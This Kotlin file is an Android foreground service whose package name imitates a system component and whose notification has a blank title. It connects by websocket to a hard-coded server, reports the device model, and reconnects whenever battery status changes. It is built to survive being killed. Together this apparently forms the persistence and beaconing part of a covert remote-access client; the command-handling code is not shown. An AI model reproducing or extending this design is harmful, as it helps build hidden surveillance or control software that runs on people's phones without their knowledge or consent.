package com.android.system.androidsystemx



import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat

class Foreground: Service() {
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()

        //run settings when notification is pressed
        val settingsIntent = Intent(this, Foreground::class.java)
        val pendingIntent = PendingIntent.getActivity(this,0,settingsIntent, PendingIntent.FLAG_IMMUTABLE)





        val notification  = NotificationCompat.Builder(this,"1509")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentTitle("")
            .setContentIntent(pendingIntent)
            .build()
        startForeground(1,notification)


        ///add running code here
        fun reconnect(){
            Log.d("check1","charging")
            val uri = "192.168.1.10:80"
            val serverUrl = "http://${uri}/{\"username\":\"${Build.MODEL}\",\"os\":\"android\",\"admin\":false}" // Replace with your server address
            if(SaveLocalData().isConnected(this)=="0"){
                Websocket().connectToWebsocket(serverUrl,this)
            }
        }

        //charger connected / disconnected receiver
        val chargingReceiver = ChargingReceiver(object : BatteryStatusCallback {
            override fun onBatteryStatusChanged() {
                reconnect()
            }
        })


        val uri = "192.168.1.10:80"
        val serverUrl = "http://${uri}/{\"username\":\"${Build.MODEL}\",\"os\":\"android\",\"admin\":false}" // Replace with your server address
        Websocket().connectToWebsocket(serverUrl,this)



        // Register the BroadcastReceiver to listen for battery changes
        val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        this.registerReceiver(chargingReceiver, filter)


        return START_STICKY
    }

    //notification channel
    private fun createNotificationChannel() {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
            val notificationChannel = NotificationChannel("1509","Android", NotificationManager.IMPORTANCE_DEFAULT)
            val notificationManager: NotificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(notificationChannel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        TODO("Not yet implemented")
    }
}
